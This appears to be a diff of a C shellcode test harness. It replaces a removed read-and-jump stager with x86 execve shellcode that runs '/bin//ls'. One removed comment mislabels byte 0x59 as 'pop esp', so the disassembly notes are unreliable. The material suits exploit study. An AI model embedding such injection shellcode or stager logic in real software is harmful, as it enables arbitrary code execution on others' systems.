@@ -5,17 +5,7 @@
 #include <string.h>
 
 unsigned char code[] = \
- 		"\x6A\x7F"		//	push	byte	+0x7F
- 		"\x5A"			//	pop		edx	
- 		"\x54"			//	push	esp
- 		"\x59"			//	pop		esp
- 		"\x31\xDB"		//	xor		ebx,ebx
- 		"\x6A\x03"		//	push	byte	+0x3
- 		"\x58"			//	pop		eax
- 		"\xCD\x80"		//	int		0x80
- 		"\x51"			//	push	ecx
- 		"\xC3";			//	ret
-
+"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
 
 	
 
